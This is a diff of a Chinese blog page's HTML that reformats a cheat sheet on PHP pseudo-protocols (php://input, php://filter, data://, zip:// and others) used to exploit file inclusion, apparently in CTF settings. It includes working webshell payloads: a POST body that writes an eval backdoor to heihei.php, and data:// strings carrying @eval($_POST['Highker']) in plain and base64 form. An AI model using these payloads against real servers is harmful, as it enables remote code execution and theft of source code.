@@ -10,7 +10,8 @@
   
 
   
-  <meta name="description" content="0x01【php://input】 利用条件: allow_url_fopen ：off/on allow_url_include：on php://input是个可以访问请求的原始数据的只读流，也就是说在POST请求的情况下，php://input可以获取到POST的数据。可以通过该伪协议进行代码">
+  <meta name="description" content="0x01【php://input】 
+利用条件: allow_url_fopen ：off/on allow_url_include：on php://input是个可以访问请求的原始数据的只读流，也就是说在POST请求的情况下，php://input可以获取到POST的数据。可以通过该伪协议进行代">
   
 
   
@@ -79,7 +80,26 @@
   <div class="article-content">
     <div class="entry">
       
-        <p><strong>0x01</strong>【<strong>php://input</strong>】 利用条件: <strong>allow_url_fopen ：off/on</strong> <strong>allow_url_include：on</strong> php://input是个可以访问请求的原始数据的只读流，也就是说在POST请求的情况下，php://input可以获取到POST的数据。可以通过该伪协议进行代码执行甚至于写shell 使用方法： POST<?php fputs(fopen(“heihei.php”,”w”),’<?php @eval($_POST\["Highker"\];?>’);?&gt; 写shell <strong>0x02【file:///】</strong> 利用条件： <strong>allow_url_fopen ：off/on</strong> <strong>allow_url_include：off/on</strong> file:/// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<strong>allow_url_fopen</strong>与<strong>allow_url_include</strong>的影响 使用方法： file:/// 文件的绝对路径和文件名 <strong>0x03</strong>【<strong><strong>php://filter</strong></strong>】 利用条件： <strong>allow_url_fopen ：off/on</strong> <strong>allow_url_include：off/on</strong> php://filter是一种元封装器， 设计用于数据流打开时的筛选过滤应用。可以用于读取源码 使用方法： php://filter/read=convert.base64-encode/resource=upload.php <strong>0x04【zip://、zlib://、bzip2://】</strong> 利用条件： <strong>allow_url_fopen ：off/on</strong> <strong>allow_url_include：off/on</strong> 三种协议均为数据压缩过滤器，功能与利用方法类似，实际上就是对压缩包内文件的直接访问，更重要的是不需要指定后缀名。 使用方法： zip://绝对路径加压缩文件名%23打开文件名 compress.zlib://绝对路径(相对路径亦可)加压缩文件名 <strong>0x05【data://】</strong> 利用条件： <strong>allow_url_fopen ：on</strong> <strong>allow_url_include：on</strong> 使用方法： data://text/plain,<?php @eval($_POST\['Highker'\])?> data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydIaWdoa2VyJ10pPz4= <strong>0x06【glob://】</strong> 利用条件： <strong>allow_url_fopen ：off/on</strong> <strong>allow_url_include：off/on</strong> 使用方法： glob://查找的文件</p>
+        <ul>
+<li><strong>0x01</strong>【<strong>php://input</strong>】 </li>
+<li>利用条件: <strong>allow_url_fopen ：off/on</strong> <strong>allow_url_include：on</strong> php://input是个可以访问请求的原始数据的只读流，也就是说在POST请求的情况下，php://input可以获取到POST的数据。可以通过该伪协议进行代码执行甚至于写shell</li>
+<li>使用方法： POST<?php fputs(fopen(“heihei.php”,”w”),’<?php @eval($_POST\["Highker"\];?>’);?&gt; 写shell </li>
+<li><strong>0x02【file:///】</strong></li>
+<li>利用条件： <strong>allow_url_fopen ：off/on</strong> <strong>allow_url_include：off/on</strong> file:/// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<strong>allow_url_fopen</strong>与<strong>allow_url_include</strong>的影响</li>
+<li>使用方法： file:/// 文件的绝对路径和文件名 </li>
+<li><strong>0x03</strong>【<strong><strong>php://filter</strong></strong>】</li>
+<li>利用条件： <strong>allow_url_fopen ：off/on</strong> <strong>allow_url_include：off/on</strong> php://filter是一种元封装器， 设计用于数据流打开时的筛选过滤应用。可以用于读取源码</li>
+<li>使用方法： php://filter/read=convert.base64-encode/resource=upload.php </li>
+<li><strong>0x04【zip://、zlib://、bzip2://】</strong></li>
+<li>利用条件： <strong>allow_url_fopen ：off/on</strong> <strong>allow_url_include：off/on</strong> 三种协议均为数据压缩过滤器，功能与利用方法类似，实际上就是对压缩包内文件的直接访问，更重要的是不需要指定后缀名。</li>
+<li>使用方法： zip://绝对路径加压缩文件名%23打开文件名 compress.zlib://绝对路径(相对路径亦可)加压缩文件名</li>
+<li><strong>0x05【data://】</strong></li>
+<li>利用条件： <strong>allow_url_fopen ：on</strong> <strong>allow_url_include：on</strong></li>
+<li>使用方法： data://text/plain,<?php @eval($_POST\['Highker'\])?> data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydIaWdoa2VyJ10pPz4=</li>
+<li><strong>0x06【glob://】</strong></li>
+<li>利用条件： <strong>allow_url_fopen ：off/on</strong> <strong>allow_url_include：off/on</strong></li>
+<li>使用方法： glob://查找的文件</li>
+</ul>
 
       
     </div>
